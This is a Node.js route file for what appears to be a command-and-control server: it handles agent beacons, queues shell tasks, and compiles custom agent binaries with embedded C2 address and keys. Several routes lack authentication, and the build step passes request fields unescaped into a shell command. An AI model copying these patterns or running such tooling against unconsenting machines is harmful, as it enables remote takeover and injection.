// Agent Routes
const express = require('express');
const router = express.Router();
const AgentService = require('../services/agentService');
const AgentModel = require('../models/Agent');
const TaskService = require('../services/taskService');
const TaskModel = require('../models/Task');
const ResultModel = require('../models/Result');
const { config } = require('../config/env');
const { authenticateJWT, requireRole } = require('../middleware/auth');
const tokenBlacklistService = require('../services/tokenBlacklistService');
const cacheService = require('../services/cacheService');
const taskQueueService = require('../services/taskQueueService');
const redisClient = require('../utils/redisClient');
const CAClient = require('../utils/caClient');
const { exec } = require('child_process');
const { promisify } = require('util');
const fs = require('fs').promises;
const path = require('path');

const execPromise = promisify(exec);

/**
 * Normalize a task object from DB/Redis into the shape expected by the Go agent.
 *
 * Backend sources:
 * - Redis queue (tasks as stored by TaskQueueService.enqueueTask)
 * - SQL function get_pending_tasks_for_agent (see infra/db/init/03-functions.sql)
 *
 * Go agent expects fields:
 * - id        (string UUID)
 * - cmd       (string, for command tasks)
 * - args      ([]string)
 * - type      ("command" | "embedded")
 * - taskType  (embedded task type, e.g. "file_list", "sys_info")
 * - params    (object with embedded task params)
 * - runOnce   (boolean)
 */
function mapTaskForAgent(task) {
  if (!task) return null;

  // Identifier can be either id (from tasks table) or task_id (from helper function)
  const id = task.id || task.task_id;

  // Command & args: stored as command + JSON args in DB
  const cmd = task.command || task.cmd || '';
  let args = [];
  if (Array.isArray(task.args)) {
    args = task.args;
  } else if (typeof task.args === 'string' && task.args.trim().length) {
    try {
      args = JSON.parse(task.args);
    } catch {
      args = [];
    }
  }

  // Task type / embedded metadata
  const rawTaskType = task.task_type || task.taskType || task.type;
  const embeddedType = task.embedded_type || task.embeddedType;
  const embeddedParams = task.embedded_params || task.params || {};
  const isEmbedded = rawTaskType === 'embedded' || !!embeddedType;

  // Normalize params to plain object
  let params = {};
  if (embeddedParams && typeof embeddedParams === 'object') {
    params = embeddedParams;
  } else if (typeof embeddedParams === 'string' && embeddedParams.trim().length) {
    try {
      params = JSON.parse(embeddedParams);
    } catch {
      params = {};
    }
  }

  // Only expose taskType to the agent for embedded tasks.
  // For command tasks, taskType should be empty so that the Go agent
  // correctly routes them through the shell command executor instead
  // of the embedded task executor.
  const normalizedTaskType = isEmbedded ? (embeddedType || rawTaskType || '') : '';

  const normalized = {
    id,
    cmd: cmd || '',
    // keep legacy `command` key too for consumers that expect it
    command: cmd || '',
    args,
    type: isEmbedded ? 'embedded' : 'command',
    taskType: normalizedTaskType,
    params,
    runOnce: !!task.run_once || !!task.runOnce
  };

  return normalized;
}

// Execute embedded task on backend
async function executeEmbeddedTask(task) {
  const taskType = task.taskType || task.embedded_type;
  const params = task.params || {};

  switch (taskType) {
    case 'sys_info':
      const os = require('os');
      return JSON.stringify({
        os: os.platform(),
        arch: os.arch(),
        hostname: os.hostname(),
        os_version: os.release(),
        kernel: os.version(),
        cpus: os.cpus().length,
        total_memory: os.totalmem(),
        free_memory: os.freemem()
      });
    case 'priv_check':
      return JSON.stringify({
        is_root: process.getuid ? process.getuid() === 0 : false,
        user: process.env.USER || process.env.USERNAME || 'unknown'
      });
    case 'cmd':
      const command = params.command;
      if (!command) return 'No command provided';
      try {
        const { stdout, stderr } = await execPromise(command, { timeout: 30000 });
        return stdout || stderr;
      } catch (err) {
        return `Error: ${err.message}`;
      }
    default:
      return `Unknown embedded task type: ${taskType}`;
  }
}

// List all agents (public)
router.get('/', async (req, res) => {
  try {
    // Support both tenant_id and tenantId for backward compatibility
    const tenantId = req.query.tenant_id || req.query.tenantId || null;
    const agents = await AgentService.getAllAgents(tenantId);
    
    // Add blacklist status to each agent
    const agentsWithBlacklistStatus = await Promise.all(
      agents.map(async (agent) => {
        const isBlacklisted = await tokenBlacklistService.isAgentBlacklisted(agent.id, agent.tenant_id);
        return { ...agent, is_blacklisted: isBlacklisted };
      })
    );
    
    res.json(agentsWithBlacklistStatus);
  } catch (error) {
    console.error('[AGENTS] Error listing agents:', error);
    res.status(500).json({ error: 'Failed to retrieve agents' });
  }
});

// Agent beacon (mTLS authenticated)
router.post('/beacon', async (req, res) => {
  try {
    const agentData = req.body;
    const clientCert = req.headers['x-forwarded-tls-client-cert'];
    const certInfo = req.headers['x-forwarded-tls-client-cert-info'];
    const agentId = req.headers['x-agent-id'];  // Read agent ID from header

    if (!clientCert) {
      return res.status(401).json({ error: 'Client certificate required' });
    }

    // Extract CN from Traefik headers (URL-encoded)
    let cn = 'unknown';
    if (certInfo) {
      const decoded = decodeURIComponent(certInfo);
      const match = decoded.match(/CN=([^,\]"]+)/);
      if (match) {
        cn = match[1].trim();
      }
    } else if (clientCert) {
      cn = AgentService.extractCNFromCert(clientCert);
    }

    // Merge header ID into body data
    agentData.id = agentId || agentData.id;
    agentData.cn = cn;

    // Tenant ID no longer comes from X-Tenant-API-Key (fallback removed) — default to null
    let tenantId = null;
    
    // Determine IP (prefer publicIp from agent, fallback to x-forwarded-for)
    const providedPublic = agentData.publicIp ? String(agentData.publicIp).trim() : null;
    const ipHeader = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString();
    const ipRaw = providedPublic || ipHeader;
    const ipNorm = String(ipRaw).split(',')[0].trim().replace(/^.*:/, '');
    agentData.ip = ipNorm;
    
    // If enabled, check cert fingerprint blacklist immediately (pre-beacon tenant lookup)
    const crypto = require('crypto');
    let incomingFingerprint = null;
    if (clientCert) {
      try {
        const b64 = clientCert.replace(/-----BEGIN CERTIFICATE-----/g, '')
                              .replace(/-----END CERTIFICATE-----/g, '')
                              .replace(/[\r\n\s]/g, '');
        const der = Buffer.from(b64, 'base64');
        incomingFingerprint = crypto.createHash('sha256').update(der).digest('hex');

        const fpRevoked = await tokenBlacklistService.isCertFingerprintRevoked(incomingFingerprint, null);
        if (fpRevoked) {
          console.log(`🚫 [BEACON] BLOCKED - Incoming certificate fingerprint is revoked: ${incomingFingerprint}`);
          return res.status(403).json({ error: 'Certificate revoked' });
        }
      } catch (e) {
        console.warn('[BEACON] Failed to compute incoming cert fingerprint:', e.message);
      }
    }

    const agent = await AgentService.handleBeacon(agentData, clientCert, tenantId);
    
    // CHECK BLACKLIST - Reject if agent is compromised
    // This check must happen AFTER handleBeacon so we have agent.tenant_id
    if (agent && agent.id && agent.tenant_id) {
      // Agent-id blacklist check
      const isBlacklisted = await tokenBlacklistService.isAgentBlacklisted(agent.id, agent.tenant_id);
      if (isBlacklisted) {
        const blacklistInfo = await tokenBlacklistService.getBlacklistInfo(agent.id, agent.tenant_id);
        console.log(`🚫 [BEACON] BLOCKED - Agent ${agent.id} is blacklisted: ${blacklistInfo?.reason || 'Unknown'}`);
        return res.status(403).json({ 
          error: 'Agent access revoked', 
          reason: blacklistInfo?.reason || 'Compromised',
          blacklistedAt: blacklistInfo?.blacklistedAt
        });
      }

      // Tenant-scoped fingerprint check (in case fingerprint was not global)
      if (incomingFingerprint) {
        const fpRevokedTenant = await tokenBlacklistService.isCertFingerprintRevoked(incomingFingerprint, agent.tenant_id);
        if (fpRevokedTenant) {
          console.log(`🚫 [BEACON] BLOCKED - Certificate fingerprint revoked for tenant ${agent.tenant_id}: ${incomingFingerprint}`);
          return res.status(403).json({ error: 'Certificate revoked (tenant scope)' });
        }
      }
    }
    
    // Cache agent status for quick lookups
    await cacheService.cacheAgentStatus(agent.id, {
      lastSeen: agent.last_seen,
      status: agent.status,
      ip: agent.ip_address
    }, agent.tenant_id);
    
    // Get pending tasks from Redis queue (fallback to SQL if Redis fails)
    let pendingTasks = [];
    let tasksFromRedis = false;
    try {
      const queueKey = redisClient.getKey('queue:agent', agent.id, agent.tenant_id);
      const processingKey = redisClient.getKey('processing:agent', agent.id, agent.tenant_id);
      
      // Get all tasks from queue
      const taskDatas = await redisClient.lRange(queueKey, 0, -1);
      
      for (const taskData of taskDatas) {
        const task = JSON.parse(taskData);
        const taskId = task.id || task.task_id;
        
        // Move to processing
        await redisClient.hSet(processingKey, taskId, JSON.stringify({
          task,
          dequeuedAt: new Date().toISOString()
        }));
        
        // Update task status to 'sent' in database
        try {
          await TaskModel.updateStatus(taskId, 'sent');
        } catch (statusErr) {
          console.warn(`[BEACON] Failed to update task ${taskId} status to sent:`, statusErr.message);
        }
        
        pendingTasks.push(task);
      }
      
      // Clear the queue
      if (taskDatas.length > 0) {
        await redisClient.del(queueKey);
        await redisClient.expire(processingKey, 3600); // 1 hour processing timeout
        tasksFromRedis = true;
      }
      
    } catch (err) {
      console.warn('[BEACON] Redis queue unavailable, using SQL fallback:', err.message);
      pendingTasks = await TaskService.getPendingTasks(agent.id);
    }
    
    console.log(`[BEACON] Agent ${agent.id} (${agent.cn}) checked in - IP: ${agent.ip_address} - ${pendingTasks.length} pending task(s)`);

    // Normalize tasks into the shape expected by the Go agent
    // Tasks from Redis are already normalized, tasks from SQL need normalization
    const tasksForAgent = tasksFromRedis 
      ? pendingTasks.filter((t) => t && (t.cmd || t.type === 'embedded'))
      : pendingTasks
          .map(mapTaskForAgent)
          .filter((t) => t && (t.cmd || t.type === 'embedded'));

    // DEBUG: log the exact tasks payload returned to agents (helps diagnose legacy/compat issues)
    if (tasksForAgent.length > 0) {
      console.log(`[BEACON] Sending ${tasksForAgent.length} task(s) to agent ${agent.id}:`, JSON.stringify(tasksForAgent));
    }

    res.json({
      status: 'ok',
      agentId: agent.id,
      message: 'Beacon received',
      tasks: tasksForAgent
    });
  } catch (err) {
    console.error('Beacon error:', err);
    res.status(500).json({ error: 'Beacon processing failed' });
  }
});

// Whoami endpoint (agent identification)
router.post('/whoami', async (req, res) => {
  try {
    const token = req.headers['x-agent-token'];
    
    if (token !== config.agentWhoamiToken) {
      return res.status(403).json({ error: 'Invalid agent token' });
    }
    
    const agentData = req.body;
    const agent = await AgentService.handleBeacon(agentData, '');
    
    res.json({
      agentId: agent.id,
      message: 'Agent registered'
    });
  } catch (err) {
    console.error('Whoami error:', err);
    res.status(500).json({ error: 'Registration failed' });
  }
});

// Build custom agent endpoint
router.post('/build-custom', async (req, res) => {
  console.log('[BUILD-CUSTOM] Handler called with body:', req.body);
  
  try {
    const tenantId = req.body.tenantId;
    
    if (!tenantId) {
      return res.status(400).json({ error: 'tenantId is required' });
    }
    
    // Fetch tenant to get API key
    const TenantModel = require('../models/Tenant');
    const tenant = await TenantModel.findById(tenantId);
    
    if (!tenant) {
      return res.status(404).json({ error: 'Tenant not found' });
    }
    
    const tenantAPIKey = tenant.api_key;
    console.log(`[BUILD-CUSTOM] Building agent for tenant: ${tenant.name}`);
    
    // Map frontend parameters
    const os = req.body.targetOS;
    const arch = req.body.targetArch;
    const c2Server = req.body.c2Server;
    const beaconInterval = req.body.beaconInterval;
    
    if (!os || !arch) {
      return res.status(400).json({ error: 'os and arch required' });
    }
    
    const agentDir = '/agents-go';
    const certDir = '/app/certs';
    
    // Generate unique certificate for this agent
    const CAClient = require('../utils/caClient');
    let clientCert, clientKey, certId;
    
    try {
      console.log(`[BUILD-CUSTOM] Generating unique certificate for agent: ${req.body.agentId}`);
      const certData = await CAClient.generateCertificate({
        userId: req.body.agentId,     // Use agent ID as user ID (becomes CN)
        sessionId: req.body.agentId,  // Use agent ID as session ID  
        role: 'agent',                // Role for organizational unit
        ttl: 31536000                 // 365 days in seconds
      });
      
      clientCert = certData.cert;
      clientKey = certData.key;
      certId = certData.certId;
      
      console.log(`[BUILD-CUSTOM] Generated certificate ${certId} with CN=${req.body.agentId}`);
    } catch (certErr) {
      console.error(`[BUILD-CUSTOM] Certificate generation failed:`, certErr.message);
      return res.status(500).json({ 
        error: 'Failed to generate agent certificate', 
        details: certErr.message 
      });
    }
    
    // Read CA certificate
    const caCert = await fs.readFile(path.join(certDir, 'ca.crt'), 'utf8');
    
    const buildOS = os === 'windows' ? 'windows' : os === 'darwin' ? 'darwin' : 'linux';
    const buildArch = arch === 'amd64' ? 'amd64' : arch === 'arm64' ? 'arm64' : '386';
    const ext = os === 'windows' ? '.exe' : '';
    const outputName = `agent-${buildOS}-${buildArch}${ext}`;
    
    // Build directly to /app/builds (persistent volume)
    const buildsDir = '/app/builds';
    await fs.mkdir(buildsDir, { recursive: true });
    
    const finalPath = path.join(buildsDir, outputName);
    
    // Serialize tasks to JSON for embedding
    const tasksJSON = JSON.stringify(req.body.tasks || []);
    
    // Escape for ldflags: replace backslashes first, then quotes
    const escapeLdflags = (str) => {
      return str
        .replace(/\\/g, '\\\\')      // Escape backslashes
        .replace(/"/g, '\\"')         // Escape double quotes
        .replace(/'/g, "'\\''");      // Escape single quotes (shell: close quote, escaped quote, open quote)
    };
    
    const ldflags = [
      `-X 'gla1ve/agent/pkg/config.EmbeddedAgentID=${req.body.agentId || ''}'`,
      `-X 'gla1ve/agent/pkg/config.BeaconInterval=${beaconInterval || '30s'}'`,
      `-X 'gla1ve/agent/pkg/config.C2Server=${c2Server || `c2.${config.domain}:4443`}'`,
      `-X 'gla1ve/agent/pkg/config.EmbeddedTasks=${escapeLdflags(tasksJSON)}'`,
      `-X 'gla1ve/agent/pkg/config.EmbeddedCACert=${caCert.replace(/\n/g, '\\n')}'`,
      `-X 'gla1ve/agent/pkg/config.EmbeddedCert=${clientCert.replace(/\n/g, '\\n')}'`,
      `-X 'gla1ve/agent/pkg/config.EmbeddedKey=${clientKey.replace(/\n/g, '\\n')}'`,
      `-X 'gla1ve/agent/pkg/config.TenantAPIKey=${tenantAPIKey}'`
    ].join(' ');
    
    // Build using absolute paths, CGO_ENABLED=0, and cwd option
    const buildCmd = `CGO_ENABLED=0 GOOS=${buildOS} GOARCH=${buildArch} go build -ldflags "${ldflags}" -o ${finalPath} ${agentDir}/cmd/agent/main.go`;
    
    console.log('[BUILD] Building agent:', { os: buildOS, arch: buildArch });
    console.log('[BUILD] Command length:', buildCmd.length);
    console.log('[BUILD] Starting build process...');
    
    const { stdout, stderr } = await execPromise(buildCmd, { 
      cwd: agentDir,
      maxBuffer: 1024 * 1024 * 10,
      timeout: 120000 // 2 minute timeout
    });
    
    console.log('[BUILD] Build process completed');
    console.log('[BUILD] stdout:', stdout ? stdout.substring(0, 500) : '(empty)');
    console.log('[BUILD] stderr:', stderr ? stderr.substring(0, 500) : '(empty)');
    
    if (stderr && !stderr.includes('warning')) {
      console.log('[BUILD] Build failed with stderr');
      throw new Error(stderr);
    }
    
    console.log('[BUILD] Getting file stats...');
    const stats = await fs.stat(finalPath);
    
    console.log('[BUILD] Success! Binary size:', stats.size, 'bytes');
    
    res.json({
      success: true,
      filename: outputName,
      size: stats.size,
      downloadPath: `/api/agents/download/${outputName}`,
      agentId: req.body.agentId,
      certId: certId,
      tasks: req.body.tasks.length,
      beaconInterval: beaconInterval || '30s',
      c2Server: c2Server || `c2.${config.domain}:4443`,
      targetOS: buildOS,
      targetArch: buildArch,
      expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
      message: 'Agent built successfully with unique certificate'
    });
  } catch (err) {
    console.error('[BUILD] ERROR:', err.message);
    console.error('[BUILD] Stack:', err.stack);
    res.status(500).json({ error: err.message || 'Build failed' });
  }
});

// Download built agent from /app/builds
router.get('/download/:filename', async (req, res) => {
  try {
    const { filename } = req.params;
    
    // Validate filename to prevent directory traversal
    if (!/^agent-[a-z]+-[a-z0-9]+(\.exe)?$/.test(filename)) {
      console.log('[DOWNLOAD] Invalid filename:', filename);
      return res.status(400).json({ error: 'Invalid filename' });
    }
    
    const buildsDir = '/app/builds';
    const filePath = path.join(buildsDir, filename);
    
    console.log('[DOWNLOAD] Serving agent binary:', filename, 'to user:', req.user?.username || 'anonymous');
    
    // Check if file exists
    await fs.access(filePath);
    
    // Get file stats
    const stats = await fs.stat(filePath);
    
    // Force fresh download by setting aggressive no-cache headers
    // and removing any conditional GET handling
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Length', stats.size);
    
    // Remove ETag to prevent conditional GET caching
    res.removeHeader('ETag');
    
    console.log('[DOWNLOAD] File stats:', { size: stats.size, mtime: stats.mtime });
    
    // Stream the file
    const fileStream = require('fs').createReadStream(filePath);
    
    fileStream.on('error', (err) => {
      console.error('[DOWNLOAD] Stream error:', err);
      if (!res.headersSent) {
        res.status(500).json({ error: 'Download failed' });
      }
    });
    
    fileStream.on('end', () => {
      console.log('[DOWNLOAD] Successfully sent:', filename);
    });
    
    fileStream.pipe(res);
    
  } catch (err) {
    console.error('[DOWNLOAD] Error:', err);
    if (err.code === 'ENOENT') {
      res.status(404).json({ error: 'File not found' });
    } else {
      res.status(500).json({ error: err.message });
    }
  }
});

// Receive embedded task results from agents
router.post('/:agentId/embedded-tasks', async (req, res) => {
  const { agentId } = req.params;
  const { results } = req.body;
  const clientCert = req.headers['x-forwarded-tls-client-cert'];
  
  if (!results || !Array.isArray(results)) {
    return res.status(400).json({ error: 'Missing results array' });
  }

  // Authentication: require mTLS client certificate (Traefik forwards the client cert).
  let agent = null;
  let incomingFingerprint = null;

  if (clientCert) {
    // Extract CN from client certificate to properly identify the agent
    const cn = AgentService.extractCNFromCert(clientCert);
    // Find agent by CN instead of relying on agentId parameter
    agent = await AgentModel.findByCN(cn);
    if (!agent) {
      console.log(`[EmbeddedTasks] Agent not found for CN: ${cn}, skipping persistence`);
      return res.json({ success: true, received: results.length, processed: 0 });
    }

    // compute fingerprint and immediately reject if fingerprint is revoked
    try {
      const pem = clientCert.replace(/-----BEGIN CERTIFICATE-----|-----END CERTIFICATE-----|\n/g, '');
      const der = Buffer.from(pem, 'base64');
      incomingFingerprint = require('crypto').createHash('sha256').update(der).digest('hex');
      const fpRevokedGlobal = await tokenBlacklistService.isCertFingerprintRevoked(incomingFingerprint, null);
      const fpRevokedTenant = await tokenBlacklistService.isCertFingerprintRevoked(incomingFingerprint, agent.tenant_id);
      if (fpRevokedGlobal || fpRevokedTenant) {
        console.log(`🚫 [EMBEDDED-TASKS] BLOCKED - Certificate fingerprint revoked: ${incomingFingerprint}`);
        return res.status(403).json({ error: 'Certificate revoked' });
      }
    } catch (e) {
      console.warn('[EmbeddedTasks] Failed to compute incoming cert fingerprint:', e.message);
    }

  } else {
    return res.status(401).json({ error: 'Client certificate required' });
  }

  // If agent is blacklisted in Redis, reject embedded results immediately
  try {
    const isBlacklisted = await tokenBlacklistService.isAgentBlacklisted(agent.id, agent.tenant_id);
    if (isBlacklisted) {
      console.log(`🚫 [EMBEDDED-TASKS] BLOCKED - Agent ${agent.id} is blacklisted`);
      return res.status(403).json({ error: 'Agent blacklisted' });
    }
  } catch (err) {
    console.error('[EMBEDDED-TASKS] Failed to check blacklist status:', err.message);
    // If Redis fails, fail closed for security
    return res.status(500).json({ error: 'Blacklist check failed' });
  }

  console.log(`[EmbeddedTasks] Received ${results.length} task results from agent: ${agentId}`);
  
  try {
    const tenantId = agent.tenant_id;
    const resolvedAgentId = agent.id;

    let processedCount = 0;

    for (const r of results) {
      const taskType = r.type || r.taskType;
      const output = r.output || r.result || '';
      const errMsg = r.error && typeof r.error === 'string' && r.error.trim().length > 0 ? r.error : null;
      const params = r.params || {};

      // Log summary for observability (same behaviour as before)
      if (taskType === 'sys_info' && output) {
        try {
          const sysInfo = typeof output === 'string' ? JSON.parse(output) : output;
          console.log(`[EmbeddedTasks] Agent ${agentId} sys_info:`, {
            os: sysInfo.os,
            arch: sysInfo.arch,
            hostname: sysInfo.hostname,
            os_version: sysInfo.os_version,
            kernel: sysInfo.kernel
          });
        } catch (err) {
          console.error(`[EmbeddedTasks] Failed to parse sys_info:`, err.message);
        }
      } else if (taskType === 'priv_check' && output) {
        try {
          const privInfo = typeof output === 'string' ? JSON.parse(output) : output;
          console.log(`[EmbeddedTasks] Agent ${agentId} priv_check:`, privInfo);
        } catch (err) {
          console.error(`[EmbeddedTasks] Failed to parse priv_check:`, err.message);
        }
      } else {
        console.log(`[EmbeddedTasks] Agent ${agentId} ${taskType}: ${String(output).substring(0, 100)}${String(output).length > 100 ? '...' : ''}`);
      }

      // Only persist if agent exists with valid UUID (skip for test/demo agents without UUID)
      if (agent && agent.id) {
        try {
          // Try to find an existing pending/sent embedded task created by the dashboard/task-builder
          // that matches this agent, embedded_type and params. If found, update that task's result
          // instead of creating a duplicate task row. This prevents the UI from showing two entries
          // (one 'sent' and a second persisted embedded-result) and preserves the original task's
          // embedded_type so the TaskTemplates description renders correctly.
          let targetTask = null;

          try {
            const allTasks = await TaskModel.getAllForAgent(resolvedAgentId);

            // 1) Try exact-match on embedded_type + params (strict equality)
            targetTask = allTasks.find(t => (
              (t.embedded_type === taskType) &&
              (t.status === 'pending' || t.status === 'sent') &&
              JSON.stringify(t.embedded_params || {}) === JSON.stringify(params || {})
            ));

            // 2) If no exact match, fall back to the most-recent pending/sent task
            //    with the same embedded_type. This covers minor param-normalization
            //    differences (path normalization, ordering, etc.) and prevents
            //    duplicate persisted tasks from appearing in the UI.
            if (!targetTask) {
              targetTask = allTasks.find(t => (
                (t.embedded_type === taskType) &&
                (t.status === 'pending' || t.status === 'sent')
              ));

              if (targetTask) {
                console.warn(`[EmbeddedTasks] Relaxed-match attached to existing task ${targetTask.id} (embedded_type=${taskType}) — params did not strictly match`);
              }
            }
          } catch (lookupErr) {
            // If lookup fails, fall back to creating a new task (best-effort)
            console.warn('[EmbeddedTasks] Failed to lookup existing task for result — will create new one:', lookupErr.message);
          }

          if (targetTask) {
            // Attach result to the existing pending task
            await TaskModel.updateResult(resolvedAgentId, targetTask.id, output, errMsg);
            console.log(`[EmbeddedTasks] Attached result to existing task ${targetTask.id} (type: ${taskType})`);
          } else {
            // No matching pending task — create a new persisted embedded task
            const createdTask = await TaskModel.create(resolvedAgentId, {
              type: 'embedded',
              taskType: taskType,
              params: params,
              runOnce: true
            }, tenantId, null);

            // Use the existing updateResult flow to insert a result and mark completed
            await TaskModel.updateResult(resolvedAgentId, createdTask.id, output, errMsg);
            console.log(`[EmbeddedTasks] Created new persisted task ${createdTask.id} for embedded result (type: ${taskType})`);
          }

          processedCount++;
        } catch (dbErr) {
          console.error(`[EmbeddedTasks] Failed to persist embedded result for ${taskType}:`, dbErr.message);
          // continue processing remaining results
        }
      } else {
        console.log(`[EmbeddedTasks] Skipping persistence for unregistered agent: ${agentId}`);
      }
    }

    console.log(`[EmbeddedTasks] Successfully processed ${processedCount}/${results.length} results from agent ${agentId}`);
    res.json({ success: true, received: results.length, processed: processedCount });
  } catch (error) {
    console.error(`[EmbeddedTasks] Error processing results:`, error);
    res.status(500).json({ error: 'Failed to process embedded tasks' });
  }
});

// Task Management Routes (for dashboard)
router.post('/:agentId/tasks', async (req, res) => {
  try {
    const { agentId } = req.params;
    const { cmd, args, type, taskType, params, runOnce } = req.body;

    // Log incoming request body for debugging
    console.log('[TASK] Incoming task request:', req.body);

    // Check if agent exists
    const agent = await AgentService.getAgent(agentId);
    if (!agent) {
      return res.status(404).json({ error: 'Agent not found' });
    }

    // Extract tenant_id from agent
    const tenantId = agent.tenant_id;
    if (!tenantId) {
      return res.status(500).json({ error: 'Agent has no tenant association' });
    }

    let task;

    // Validation: must have either cmd or taskType
    if (!cmd && !taskType) {
      return res.status(400).json({ error: 'Task must have either cmd or taskType' });
    }

    // Handle embedded task format (from task builder)
    // Only treat as embedded when explicitly requested or when taskType is an embedded kind.
    if (type === 'embedded' || (taskType && taskType !== 'command')) {
      if (!taskType) {
        return res.status(400).json({ error: 'taskType required for embedded tasks' });
      }
      task = await TaskService.createTask(agentId, {
        type: 'embedded',
        taskType: taskType,
        params: params || {},
        runOnce: runOnce || false
      }, tenantId, req.user?.userId);
      console.log(`[TASK] Created embedded task ${task.id} for agent ${agentId}: ${taskType}`);
    }
    // Handle quick command format
    else if (cmd) {
      task = await TaskService.createTask(agentId, {
        cmd,
        args: args || []
      }, tenantId, req.user?.userId);
      console.log(`[TASK] Created task ${task.id} for agent ${agentId}: ${cmd} ${(args || []).join(' ')}`);
    }
    else {
      return res.status(400).json({ error: 'Either cmd or taskType required' });
    }

    // Enqueue task to Redis so it gets picked up by the agent immediately
    try {
      const normalizedTask = mapTaskForAgent(task);
      await taskQueueService.enqueueTask(agentId, normalizedTask, tenantId);
      console.log(`[TASK] Task ${task.id} enqueued to Redis for agent ${agentId}`);
    } catch (redisErr) {
      console.warn(`[TASK] Failed to enqueue to Redis (will use SQL fallback):`, redisErr.message);
      // Continue anyway - SQL fallback will pick it up
    }

    res.status(201).json(task);
  } catch (err) {
    console.error('[TASK] Creation error:', err);
    res.status(500).json({ error: 'Failed to create task' });
  }
});

router.get('/:agentId/tasks', async (req, res) => {
  try {
    const { agentId } = req.params;
    const tasks = await TaskService.getAllTasks(agentId);
    res.json(tasks);
  } catch (err) {
    console.error('[TASK] Get tasks error:', err);
    res.status(500).json({ error: 'Failed to get tasks' });
  }
});

router.post('/:agentId/tasks/:taskId/result', async (req, res) => {
  try {
    const { agentId, taskId } = req.params;

    // Log incoming result body for debugging (temporary, helps verify agent payload)
    console.log(`[TASK-RESULT] Incoming result for ${taskId} from ${agentId}:`, JSON.stringify(req.body));

    const { result, error } = req.body;
    
    const task = await TaskService.updateTaskResult(agentId, taskId, result, error);
    
    if (!task) {
      return res.status(404).json({ error: 'Task not found' });
    }

    // Remove task from Redis processing set + clear the queued list entry so it is not
    // repeatedly sent on subsequent beacons.
    try {
      const AgentModel = require('../models/Agent');
      const agent = await AgentModel.findById(agentId);
      const tenantId = agent ? agent.tenant_id : null;
      const resolvedAgentId = agent && agent.id ? agent.id : agentId; // prefer UUID

      // Remove from processing hash (best-effort)
      await taskQueueService.completeTask(resolvedAgentId, taskId, tenantId).catch(() => {});

      // Remove the actual queued list element (best-effort)
      await taskQueueService.removeTaskFromQueue(resolvedAgentId, tenantId, taskId).catch(() => {});
    } catch (queueErr) {
      console.warn('[TASK] Failed to clean task from Redis queue (best-effort):', queueErr.message);
    }
    
    console.log(`[TASK] Task ${taskId} completed for agent ${agentId}: ${task.status}`);
    
    res.json(task);
  } catch (err) {
    console.error('[TASK] Result update error:', err);
    res.status(500).json({ error: 'Failed to update task result' });
  }
});

// Reassign agent to different tenant (admin only)
router.put('/:agentId/tenant', authenticateJWT, requireRole('admin'), async (req, res) => {
  try {
    const { agentId } = req.params;
    const { tenantId } = req.body;
    
    if (!tenantId) {
      return res.status(400).json({ error: 'tenantId is required' });
    }
    
    // Verify tenant exists
    const TenantModel = require('../models/Tenant');
    const tenant = await TenantModel.findById(tenantId);
    
    if (!tenant) {
      return res.status(404).json({ error: 'Tenant not found' });
    }
    
    // Verify agent exists
    const AgentModel = require('../models/Agent');
    const existingAgent = await AgentModel.findById(agentId);
    
    if (!existingAgent) {
      return res.status(404).json({ error: 'Agent not found' });
    }
    
    // Reassign agent
    const updatedAgent = await AgentModel.reassignTenant(agentId, tenantId);
    
    console.log(`[AGENT] Agent ${agentId} reassigned from tenant ${existingAgent.tenant_id} to ${tenantId}`);
    
    res.json({
      message: 'Agent reassigned successfully',
      agent: updatedAgent
    });
  } catch (err) {
    console.error('[AGENT] Reassignment error:', err);
    res.status(500).json({ error: 'Failed to reassign agent' });
  }
});

// ==================== TOKEN BLACKLIST MANAGEMENT ====================

// Blacklist an agent (revoke access)
router.post('/:agentId/blacklist', authenticateJWT, requireRole('admin'), async (req, res) => {
  try {
    const { agentId } = req.params;
    const { reason, ttl } = req.body;
    
    // Verify agent exists and get tenant info
    const AgentModel = require('../models/Agent');
    const agent = await AgentModel.findById(agentId);
    
    if (!agent) {
      return res.status(404).json({ error: 'Agent not found' });
    }
    
    // Blacklist the agent token
    const result = await tokenBlacklistService.blacklistAgentToken(
      agentId,
      'agent-token', // Token placeholder (we use agent ID for identification)
      reason || 'Compromised by administrator',
      agent.tenant_id,
      ttl
    );
    
    // Revoke certificate if cert_id exists
    if (agent.cert_id) {
      try {
        await CAClient.revokeCertificate(
          agent.cert_id, 
          'agent_blacklisted'
        );
        console.log(`[BLACKLIST] Certificate ${agent.cert_id} revoked for agent ${agentId}`);
      } catch (err) {
        console.error(`[BLACKLIST] Failed to revoke certificate ${agent.cert_id}:`, err);
        // Continue with blacklist even if cert revocation fails
      }
    } else {
      console.log(`[BLACKLIST] No cert_id found for agent ${agentId}, skipping certificate revocation`);
    }
    
    // Invalidate agent cache
    await cacheService.invalidateAgent(agentId, agent.tenant_id);
    
    console.log(`[BLACKLIST] Agent ${agentId} blacklisted by user ${req.user.userId}`);
    
    res.json({
      message: 'Agent blacklisted successfully',
      agentId,
      ...result
    });
  } catch (err) {
    console.error('[BLACKLIST] Error blacklisting agent:', err);
    res.status(500).json({ error: 'Failed to blacklist agent' });
  }
});

// Remove agent from blacklist (restore access)
router.delete('/:agentId/blacklist', authenticateJWT, requireRole('admin'), async (req, res) => {
  try {
    const { agentId } = req.params;
    
    // Get agent tenant info
    const AgentModel = require('../models/Agent');
    const agent = await AgentModel.findById(agentId);
    
    if (!agent) {
      return res.status(404).json({ error: 'Agent not found' });
    }
    
    // Remove from blacklist
    await tokenBlacklistService.removeFromBlacklist(agentId, agent.tenant_id);
    
    console.log(`[BLACKLIST] Agent ${agentId} removed from blacklist by user ${req.user.userId}`);
    
    res.json({
      message: 'Agent removed from blacklist',
      agentId
    });
  } catch (err) {
    console.error('[BLACKLIST] Error removing from blacklist:', err);
    res.status(500).json({ error: 'Failed to remove agent from blacklist' });
  }
});

// Get blacklist status for an agent
router.get('/:agentId/blacklist', authenticateJWT, async (req, res) => {
  try {
    const { agentId } = req.params;
    
    // Get agent tenant info
    const AgentModel = require('../models/Agent');
    const agent = await AgentModel.findById(agentId);
    
    if (!agent) {
      return res.status(404).json({ error: 'Agent not found' });
    }
    
